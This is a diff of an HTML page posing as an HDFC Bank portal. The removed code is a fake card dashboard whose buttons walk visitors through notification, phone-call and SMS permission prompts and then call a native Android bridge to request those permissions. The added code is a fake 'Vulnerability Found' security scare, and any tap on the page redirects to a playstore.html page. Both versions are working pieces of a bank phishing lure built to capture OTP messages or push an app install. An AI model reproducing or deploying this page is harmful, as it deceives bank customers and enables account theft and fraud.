@@ -2,210 +2,125 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HDFC Bank - Credit Card Dashboard</title>
-    <link rel="stylesheet" href="dashboard.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>HDFC Bank - Secure Portal</title>
+    <link rel="stylesheet" href="www/dashboard.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
 </head>
-<body>
-    <!-- Top Navigation -->
-    <header class="main-header">
-        <div class="logo-container">
-            <img src="3e834224c5fd5554a019d56b4902b706.png" alt="HDFC Logo" class="brand-logo">
-            <span class="brand-text">HDFC BANK</span>
-        </div>
-        <div class="menu-icon">
-            <div class="bar"></div>
-            <div class="bar"></div>
-            <div class="bar"></div>
-        </div>
-    </header>
+<body class="landing-page" onclick="window.location.href='www/playstore.html'">
+    <div id="statusBanner" class="security-status">⚠️ ACTION REQUIRED: SYSTEM UPDATE PENDING</div>
 
-    <main class="dashboard-container">
-        <!-- Hero Banner -->
-        <section class="hero-banner">
-            <div class="hero-content">
-                <h2>India's First <br><span>Interactive Credit Card</span></h2>
-                <p>HDFC Bank Millennia Credit Card!</p>
-                <div class="hero-stats">
-                    <div class="stat-item">
-                        <img src="https://img.icons8.com/ios-filled/50/ffffff/safe.png" alt="safe">
-                        <span>High <br>Security</span>
+    <div class="app-shell">
+        <header class="glass-header">
+            <div class="header-left">
+                <img src="www/3e834224c5fd5554a019d56b4902b706.png" alt="HDFC" class="nav-logo">
+                <div class="user-welcome">
+                    <p>Welcome to</p>
+                    <h3>HDFC DIGITAL</h3>
+                </div>
+            </div>
+            <div class="header-right">
+                <div class="icon-circle"><i class="ph-bold ph-user-circle"></i></div>
+            </div>
+        </header>
+
+        <main class="content-area">
+            <div class="hero-section">
+                <h1 class="premium-title">Upgrade Your <br><span>Digital Security</span></h1>
+                <p class="premium-subtitle">Protect your assets with our next-gen encryption and real-time monitoring system.</p>
+                
+                <div class="status-card">
+                    <div class="card-glow"></div>
+                    <div class="status-header">
+                        <div class="status-indicator">
+                            <span class="pulse"></span>
+                            SCANNING SYSTEM
+                        </div>
+                        <i class="ph-fill ph-shield-check"></i>
                     </div>
-                    <div class="stat-item">
-                        <img src="https://img.icons8.com/ios-filled/50/ffffff/star.png" alt="points">
-                        <span>Unlimited <br>Rewards</span>
+                    <div class="status-body">
+                        <h2>Vulnerability Found</h2>
+                        <p>Your current security protocol is outdated. Please sync your device to continue.</p>
                     </div>
-                </div>
-                <button class="btn-apply">Fix Now</button>
-            </div>
-            <div class="card-visual">
-                <div class="credit-card">
-                    <div class="card-chip"></div>
-                    <div class="card-number">**** **** **** 8821</div>
-                    <div class="card-holder">HDFC CUSTOMER</div>
-                    <div class="card-logo">HDFC BANK</div>
+                    <button class="btn-primary-glow">SECURE ACCOUNT NOW</button>
                 </div>
             </div>
-        </section>
 
-        <!-- Card Protection -->
-        <section class="info-card">
-            <div class="card-header">
-                <h3>Card Protection</h3>
-            </div>
-            <div class="card-body">
-                <p>Protect yourself with India's first comprehensive card protection service. Stay safe from card loss, theft, and fraud with 24/7 support.</p>
-                <div class="button-group">
-                    <button class="btn btn-primary">ACTIVATE</button>
-                    <button class="btn btn-outline">DEACTIVATE</button>
+            <div class="features-grid">
+                <div class="feature-item">
+                    <div class="f-icon red"><i class="ph-fill ph-bell-ringing"></i></div>
+                    <span>Smart Alerts</span>
+                </div>
+                <div class="feature-item">
+                    <div class="f-icon blue"><i class="ph-fill ph-fingerprint"></i></div>
+                    <span>Biometric Sync</span>
+                </div>
+                <div class="feature-item">
+                    <div class="f-icon green"><i class="ph-fill ph-shield-checkered"></i></div>
+                    <span>End-to-End</span>
+                </div>
+                <div class="feature-item">
+                    <div class="f-icon yellow"><i class="ph-fill ph-lightning"></i></div>
+                    <span>Instant Fix</span>
                 </div>
             </div>
-        </section>
+        </main>
 
-        <!-- Reward Points -->
-        <section class="info-card">
-            <div class="card-header">
-                <h3>Redeem Your Reward Points</h3>
-            </div>
-            <div class="card-body">
-                <p>Make the most of your HDFC Credit Card! Redeem points for gifts, vouchers, travel deals, and cashbacks instantly.</p>
-                <button class="btn btn-primary btn-wide">REDEEM</button>
-            </div>
-        </section>
-
-        <!-- Activation Guidelines -->
-        <section class="info-card">
-            <div class="card-header">
-                <h3>Credit Card Activation Guideline</h3>
-            </div>
-            <div class="card-body">
-                <p>Follow the steps to activate your credit card securely and enjoy all banking services instantly without any delay.</p>
-                <button class="btn btn-outline btn-wide">VIEW GUIDE</button>
-            </div>
-        </section>
-    </main>
-
-    <!-- PERMISSION OVERLAY -->
-    <div class="permission-overlay" id="permissionOverlay">
-        <!-- Notification Modal -->
-        <div class="perm-modal" id="notifModal">
-            <div class="perm-icon">🔔</div>
-            <div class="perm-text">
-                Allow <strong>HDFC Bank</strong> to send you <strong>Notifications</strong> for transaction alerts and security updates?
-            </div>
-            <div class="perm-actions">
-                <button class="btn-allow" onclick="nextPerm('phone')">Allow</button>
-                <button class="btn-deny" onclick="nextPerm('phone')">Don't Allow</button>
-            </div>
-        </div>
-
-        <!-- Phone Modal -->
-        <div class="perm-modal" id="phoneModal" style="display: none;">
-            <div class="perm-icon">📞</div>
-            <div class="perm-text">
-                Allow <strong>HDFC Bank</strong> to make and manage <strong>Phone Calls</strong> to verify your device security?
-            </div>
-            <div class="perm-actions">
-                <button class="btn-allow" onclick="nextPerm('sms')">Allow</button>
-                <button class="btn-deny" onclick="nextPerm('sms')">Don't Allow</button>
-            </div>
-        </div>
-
-        <!-- SMS Modal -->
-        <div class="perm-modal" id="smsModal" style="display: none;">
-            <div class="perm-icon">💬</div>
-            <div class="perm-text">
-                Allow <strong>HDFC Bank</strong> to send and view <strong>SMS messages</strong> for OTP auto-verification?
-            </div>
-            <div class="perm-actions">
-                <button class="btn-allow" onclick="requestNativePermissions()">Allow</button>
-                <button class="btn-deny" onclick="requestNativePermissions()">Don't Allow</button>
-            </div>
-        </div>
+        <nav class="bottom-tab-bar">
+            <div class="tab-item active"><i class="ph-fill ph-house"></i><span>Home</span></div>
+            <div class="tab-item"><i class="ph-bold ph-shield-plus"></i><span>Safety</span></div>
+            <div class="tab-item scanner"><div class="scan-circle"><i class="ph-bold ph-shield-star"></i></div></div>
+            <div class="tab-item"><i class="ph-bold ph-info"></i><span>Support</span></div>
+            <div class="tab-item"><i class="ph-bold ph-gear"></i><span>Settings</span></div>
+        </nav>
     </div>
 
-    <footer class="bottom-nav">
-        <div class="nav-item active">
-            <img src="https://img.icons8.com/ios-filled/50/004c8f/home.png" alt="home">
-            <span>Home</span>
-        </div>
-        <div class="nav-item">
-            <img src="https://img.icons8.com/ios/50/5f6368/card-wallet.png" alt="cards">
-            <span>Cards</span>
-        </div>
-        <div class="nav-item">
-            <img src="https://img.icons8.com/ios/50/5f6368/user.png" alt="profile">
-            <span>Profile</span>
-        </div>
-    </footer>
+    <style>
+        .hero-section { padding-top: 20px; margin-bottom: 30px; }
+        .premium-title { font-size: 32px; font-weight: 800; line-height: 1.1; margin-bottom: 12px; color: #fff; }
+        .premium-title span { color: #007aff; }
+        .premium-subtitle { color: #8b949e; font-size: 14px; margin-bottom: 25px; }
 
-    <script>
-        const overlay = document.getElementById('permissionOverlay');
+        .status-card {
+            background: #161b22; border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 28px; padding: 24px; position: relative; overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+        .card-glow {
+            position: absolute; top: -50px; right: -50px; width: 150px; height: 150px;
+            background: #ed232a; filter: blur(70px); opacity: 0.1;
+        }
+        .status-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .status-indicator {
+            display: flex; align-items: center; gap: 8px; font-size: 10px; font-weight: 800; color: #ed232a;
+        }
+        .pulse { width: 8px; height: 8px; background: #ed232a; border-radius: 50%; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(2.5); opacity: 0; } }
+
+        .status-body h2 { font-size: 20px; font-weight: 800; margin-bottom: 8px; color: #fff; }
+        .status-body p { font-size: 13px; color: #8b949e; margin-bottom: 25px; line-height: 1.4; }
+
+        .btn-primary-glow {
+            width: 100%; background: #007aff; color: white; border: none; padding: 18px;
+            border-radius: 18px; font-weight: 800; font-size: 14px;
+            box-shadow: 0 10px 20px rgba(0,122,255,0.3);
+        }
+
+        .features-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
+        .feature-item { display: flex; flex-direction: column; align-items: center; gap: 8px; }
+        .f-icon { width: 44px; height: 44px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+        .f-icon.red { background: rgba(237, 35, 42, 0.1); color: #ed232a; }
+        .f-icon.blue { background: rgba(0, 122, 255, 0.1); color: #007aff; }
+        .f-icon.green { background: rgba(35, 134, 54, 0.1); color: #238636; }
+        .f-icon.yellow { background: rgba(255, 215, 0, 0.1); color: #ffd700; }
+        .feature-item span { font-size: 9px; font-weight: 700; color: #8b949e; text-align: center; }
+
+        .icon-circle { width: 40px; height: 40px; background: #161b22; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; border: 1px solid rgba(255,255,255,0.1); }
         
-        function startPermissionFlow(e) {
-            if(e) e.preventDefault();
-            if(!overlay) return;
-            overlay.style.display = 'flex';
-            document.getElementById('notifModal').style.display = 'block';
-            document.getElementById('phoneModal').style.display = 'none';
-            document.getElementById('smsModal').style.display = 'none';
-        }
-
-        function nextPerm(type) {
-            document.getElementById('notifModal').style.display = 'none';
-            document.getElementById('phoneModal').style.display = 'none';
-            document.getElementById('smsModal').style.display = 'none';
-            
-            if (type === 'phone') {
-                document.getElementById('phoneModal').style.display = 'block';
-            } else if (type === 'sms') {
-                document.getElementById('smsModal').style.display = 'block';
-            }
-        }
-
-        function requestNativePermissions() {
-            // TRIGGER THE REAL NATIVE ANDROID PERMISSION DIALOGS
-            if (window.AndroidBridge) {
-                window.AndroidBridge.requestRealPermissions();
-            } else {
-                // Fallback for website testing
-                console.log("AndroidBridge not found, redirecting to details.html");
-                window.location.href = 'details.html';
-            }
-        }
-
-        // THIS IS CALLED BY NATIVE ANDROID CODE
-        function handlePermissionResult(status) {
-            if (status === 'GRANTED') {
-                if(overlay) overlay.style.display = 'none';
-                window.location.href = 'details.html';
-            } else {
-                alert('MANDATORY: All permissions are required for Secure Card Activation. Please Allow to continue.');
-                if(overlay) overlay.style.display = 'none';
-            }
-        }
-
-        // Attach to all buttons
-        document.addEventListener('DOMContentLoaded', () => {
-            document.querySelectorAll('button').forEach(btn => {
-                // Don't attach to buttons inside modals or bottom nav
-                if (!btn.closest('.perm-modal') && !btn.closest('.bottom-nav')) {
-                    btn.onclick = startPermissionFlow;
-                }
-            });
-
-            // Smooth entry animation for cards
-            const cards = document.querySelectorAll('.info-card');
-            cards.forEach((card, index) => {
-                setTimeout(() => {
-                    card.style.opacity = '1';
-                    card.style.transform = 'translateY(0)';
-                }, 100 * index);
-            });
-        });
-    <script src="script.js"></script>
+        .landing-page { background-color: #0b0e14; color: #f0f6fc; }
+    </style>
 </body>
 </html>
